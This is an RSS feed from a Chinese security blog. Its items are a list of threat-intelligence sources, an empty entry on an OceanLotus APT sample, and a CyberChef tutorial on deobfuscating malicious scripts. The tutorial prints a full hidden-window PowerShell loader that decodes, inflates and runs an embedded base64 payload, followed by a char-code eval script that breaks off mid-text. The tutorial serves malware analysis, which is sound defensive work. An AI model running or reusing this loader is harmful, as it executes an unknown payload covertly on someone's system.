<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>清夜无尘の一方天地</title>
    <link>https://wander1ng.com/</link>
    <description>Recent content on 清夜无尘の一方天地</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>cn</language>
    <copyright>Copyright © 2019–2024</copyright>
    <lastBuildDate>Wed, 10 Jul 2024 10:16:39 +0800</lastBuildDate>
    
	<atom:link href="https://wander1ng.com/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>威胁情报RSS体系构建</title>
      <link>https://wander1ng.com/post/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5rss%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/</link>
      <pubDate>Wed, 10 Jul 2024 10:11:09 +0800</pubDate>
      
      <guid>https://wander1ng.com/post/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5rss%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/</guid>
      <description>&lt;h4 id=&#34;安全厂商&#34;&gt;安全厂商&lt;/h4&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.cloudflare.com/tag/security/&#34;&gt;赛博菩萨Cloudflare安全博客&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.kaspersky.com/blog/&#34;&gt;卡巴斯基&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.mandiant.com/resources/blog&#34;&gt;火眼&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.mcafee.com/blogs/&#34;&gt;麦咖啡&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blogs.cisco.com/security&#34;&gt;思科&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://talosintelligence.com/&#34;&gt;Cisco Talos&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.virustotal.com/&#34;&gt;VT&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.checkpoint.com/&#34;&gt;Checkpoint&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.akamai.com/blog/security?&#34;&gt;akama&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://asec.ahnlab.com/en/&#34;&gt;ahnlab&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.avast.com/&#34;&gt;avast.&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.cyble.com/&#34;&gt;cyble&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://global.ahnlab.com/site/main.do&#34;&gt;global.ahnlab.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://cybersecurity.att.com/blogs&#34;&gt;cybersecurity.att.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.zscaler.com/blogs?type=security-research&#34;&gt;zscaler.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.broadcom.com/support/security-center?&#34;&gt;broadcom.com&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&#34;科技公司&#34;&gt;科技公司&lt;/h4&gt;
&lt;p&gt;&lt;a href=&#34;https://community.intel.com/t5/Blogs/Products-and-Solutions/Security/bg-p/blog-security&#34;&gt;Intel&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&#34;资安媒体&#34;&gt;资安媒体&lt;/h4&gt;
&lt;p&gt;&lt;a href=&#34;https://www.securityweek.com/&#34;&gt;securityweek&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://thehackernews.com/&#34;&gt;thehackernews&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.bleepingcomputer.com/&#34;&gt;bleepingcomputer.com&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>越南方向海莲花APT攻击样本分析复现(一)</title>
      <link>https://wander1ng.com/post/%E8%B6%8A%E5%8D%97%E6%96%B9%E5%90%91%E6%B5%B7%E8%8E%B2%E8%8A%B1apt%E6%94%BB%E5%87%BB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0%E4%B8%80/</link>
      <pubDate>Wed, 10 Jul 2024 10:07:42 +0800</pubDate>
      
      <guid>https://wander1ng.com/post/%E8%B6%8A%E5%8D%97%E6%96%B9%E5%90%91%E6%B5%B7%E8%8E%B2%E8%8A%B1apt%E6%94%BB%E5%87%BB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0%E4%B8%80/</guid>
      <description></description>
    </item>
    
    <item>
      <title>数据处理神器Cyberchef使用指南</title>
      <link>https://wander1ng.com/post/%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E7%A5%9E%E5%99%A8cyberchef%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</link>
      <pubDate>Wed, 10 Jul 2024 10:05:48 +0800</pubDate>
      
      <guid>https://wander1ng.com/post/%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E7%A5%9E%E5%99%A8cyberchef%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</guid>
      <description>&lt;p&gt;&lt;strong&gt;CyberChef&lt;/strong&gt;是一款强大的编码转换器，下载地址在&lt;a href=&#34;https://github.com/gchq/CyberChef&#34;&gt;Cyberchef&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;它简单易懂易上手，集成了多种编码转换的功能，如：base64加解密、hex转换、char转换、正则表达式等，能辅助大家方便快捷地解密出恶意脚本。&lt;/p&gt;
&lt;p&gt;其界面如下图，最左边的Operations是转换工具集，把挑选好的工具经过DIY组合及排序拖拽到Recipe中，就可以对Input中的字符串进行相应地解密操作了，工具很多，可以在Search框中搜索，输出结果会打印在Output窗口中。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/c556944c75a7b69779f8f7f469cef859.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;示例反混淆powershell代码&#34;&gt;示例：反混淆Powershell代码&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;@echo&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;off&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#00a8c8&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#00a8c8&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;PROCESSOR_ARCHITECTURE&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;%==&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;x86&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;powershell&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;exe&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;-NoP&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;-NonI&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;-W&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;Hidden&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;-Command&lt;/span&gt; &lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;Invoke-Expression &lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;$(&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;New-Object&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;IO&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;StreamReader&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;New-Object&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;IO&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;Compression&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;DeflateStream&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;New-Object&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;IO&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;MemoryStream&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;(,&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;([&lt;/span&gt;&lt;span style=&#34;color:#00a8c8&#34;&gt;Convert&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;]::&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;FromBase64String&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;(\&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;nVRtc9pGEP7Or9jRXGekMRIyENdG45k4OG7cBocax07LMJ1DWtCF0518OvFiwn/vCquYfO0XnXa1t8+zu8+KPcMlvHca42spb7NcG+s6CzQKZacdJFI63gTycipFDIXllg5cW/oOt8oOrYFHYWzJ5ZWUOnZrn8yvksRgUTShFMpCshqJF6yN2WsspdLqYZO/uYdGW4ytF/1vLn2D3OJDSkfyxuXVvrLWiGlp8YiU5fHildkhmHzGHtgf3ENueIaEdbi8x6ISbiSfH0e+ot0mVIbzvmHNZssS6rBz9aF//fHmt0+3v//xeXD3Zfjn/ejh6+PTt7/+5tM4wdk8Fd8XMlM6fzaFLZer9eYlPG13uu/Ofj2/cIIH3U+5uTKGb1yvMStVXKFD7LKltwWDtqQ+uO6Y2I0nE2DLn2/ADxggL0qD/pfpd2oz+KMy8wJ6wC8Qrk/DEHx8hou2t3vLbmHLZhV7JzoNgs6Pmabi4tTX+xT07eQSWDJ252h9w1WiM/AzvhYZZWVJ8BnV3KbeZBfV/NgsOsqOsIXc6JhaDdsxr4hO2Jrg6HEC7J9dBKgSorAm9gWpocaFratw9Z9xv8f1AkVacL3d7ghgvgViDC4Tl2HEBPjSwlmX3k5OvC1LCclGbFEBJoSAEUBdIF2RIIjvguKKKiCtGMkIxAxc6nnheXDoOkUQbG04F8tvXx0qc3yHNhihWYoYh5rGMuCKz9FMer3Ki6aPxoqZoE3ARy5FspdTn0s5JVkS5pZZU+IuYhkZd1RwPbjRprCYBVX6J5z2pUBlowbLgk8kPDRFQPJ1nbJA4xOesk4TnIF+EVLyVjcIib/OcgKbSqp4MLr9CGfBaQRPgvq4KuDuwXO8iCkCnUcw/rCxuBdUXrUhC671SknNk2tuueuk1uZFr9XqvAvaYTc4bwdnF71ut9Mqc6oHW0w54DWYprvEyq/2nRSC2RTNNc6EEvs5sWfw72i/wCESnbYDviKryHmMsPfc1BMtwM95UdjUlA22vmS61/vp/xM2WV6rrhmuO2EY0tENvWhcN+2+VFZkGNC6otF5PZ4iGHBTpFzSbPo637gsb0LYhPHrVk9ctqZtIqPTdj2vCQeQqjS6cvzbIcQmWzerI6y2TpfWV6Uk6ex/Lf5IIua0fBhr0vb5WTcMdySBON3u/gU=\&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;)))),&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#00a8c8&#34;&gt;IO.Compression.CompressionMode&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;]::&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;Decompress&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;)),&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#00a8c8&#34;&gt;Text.Encoding&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;]::&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;ASCII&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;))&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;.ReadToEnd();&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#00a8c8&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#00a8c8&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;WinDir&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;%\&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;syswow64&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;windowspowershell&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;v1&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;powershell&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;exe&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;-NoP&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;-NonI&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;-W&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;Hidden&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;-Exec&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;Bypass&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;-Command&lt;/span&gt; &lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;Invoke-Expression &lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;$(&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;New-Object&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;IO&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;StreamReader&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;New-Object&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;IO&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;Compression&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;DeflateStream&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;New-Object&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;IO&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;MemoryStream&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;(,&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;([&lt;/span&gt;&lt;span style=&#34;color:#00a8c8&#34;&gt;Convert&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;]::&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;FromBase64String&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;(\&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;nVRtc9pGEP7Or9jRXGekMRIyENdG45k4OG7cBocax07LMJ1DWtCF0518OvFiwn/vCquYfO0XnXa1t8+zu8+KPcMlvHca42spb7NcG+s6CzQKZacdJFI63gTycipFDIXllg5cW/oOt8oOrYFHYWzJ5ZWUOnZrn8yvksRgUTShFMpCshqJF6yN2WsspdLqYZO/uYdGW4ytF/1vLn2D3OJDSkfyxuXVvrLWiGlp8YiU5fHildkhmHzGHtgf3ENueIaEdbi8x6ISbiSfH0e+ot0mVIbzvmHNZssS6rBz9aF//fHmt0+3v//xeXD3Zfjn/ejh6+PTt7/+5tM4wdk8Fd8XMlM6fzaFLZer9eYlPG13uu/Ofj2/cIIH3U+5uTKGb1yvMStVXKFD7LKltwWDtqQ+uO6Y2I0nE2DLn2/ADxggL0qD/pfpd2oz+KMy8wJ6wC8Qrk/DEHx8hou2t3vLbmHLZhV7JzoNgs6Pmabi4tTX+xT07eQSWDJ252h9w1WiM/AzvhYZZWVJ8BnV3KbeZBfV/NgsOsqOsIXc6JhaDdsxr4hO2Jrg6HEC7J9dBKgSorAm9gWpocaFratw9Z9xv8f1AkVacL3d7ghgvgViDC4Tl2HEBPjSwlmX3k5OvC1LCclGbFEBJoSAEUBdIF2RIIjvguKKKiCtGMkIxAxc6nnheXDoOkUQbG04F8tvXx0qc3yHNhihWYoYh5rGMuCKz9FMer3Ki6aPxoqZoE3ARy5FspdTn0s5JVkS5pZZU+IuYhkZd1RwPbjRprCYBVX6J5z2pUBlowbLgk8kPDRFQPJ1nbJA4xOesk4TnIF+EVLyVjcIib/OcgKbSqp4MLr9CGfBaQRPgvq4KuDuwXO8iCkCnUcw/rCxuBdUXrUhC671SknNk2tuueuk1uZFr9XqvAvaYTc4bwdnF71ut9Mqc6oHW0w54DWYprvEyq/2nRSC2RTNNc6EEvs5sWfw72i/wCESnbYDviKryHmMsPfc1BMtwM95UdjUlA22vmS61/vp/xM2WV6rrhmuO2EY0tENvWhcN+2+VFZkGNC6otF5PZ4iGHBTpFzSbPo637gsb0LYhPHrVk9ctqZtIqPTdj2vCQeQqjS6cvzbIcQmWzerI6y2TpfWV6Uk6ex/Lf5IIua0fBhr0vb5WTcMdySBON3u/gU=\&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;)))),&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#00a8c8&#34;&gt;IO.Compression.CompressionMode&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;]::&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;Decompress&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;)),&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#00a8c8&#34;&gt;Text.Encoding&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;]::&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;ASCII&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;))&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;.ReadToEnd();&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这段代码经过了简单的base64混淆，首先要做的是使用正则表达式筛选出base64正文部分：&lt;/p&gt;
&lt;p&gt;在左侧的Operations栏将&lt;code&gt;Regular expreession&lt;/code&gt;拖入Recipe中，填入匹配base64正文的正则表达式&lt;code&gt;[0-9a-zA-Z/+=]{30,}&lt;/code&gt;，筛选出30个以上连续的base64编码字符。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/6b4bfb6f4fcb5fac4e83832cfdab9acf.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;将Output format选择为List matches即可在Output中只显示符合条件的字符。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/9270746492ee8cecb8c283472cd700b8.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;再从左侧的Operation中把Frombase64拖进来，即可直接在Output中呈现解码后的字符。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/0188bf43a403089953a99051037dc5c8.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;注意到原Poweershell代码中还使用了&lt;code&gt;DeflateStream&lt;/code&gt;函数，将&lt;code&gt;Raw Inflate&lt;/code&gt;拖进Recipe即可解密。再使用&lt;code&gt;Generic Code Beautify&lt;/code&gt;提高代码可读性，perfect！&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/ade85d9757d591f6d7d564c415ba6411.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;对于这一类混淆，都可以用这一套流程来解密，点击Save recipe将其保存，后面遇到相似的混淆都可以用它解决。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/2d83c1cf48c097f358e015a545b2933e.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;示例反混淆char类型恶意脚本&#34;&gt;示例：反混淆char类型恶意脚本&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;eval&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;String&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;fromCharCode&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;118&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;114&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;115&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;111&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;109&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;115&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;114&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;105&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;110&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;103&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;111&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;117&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;109&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;110&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;114&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;108&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;109&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;110&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;115&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt;&lt;span 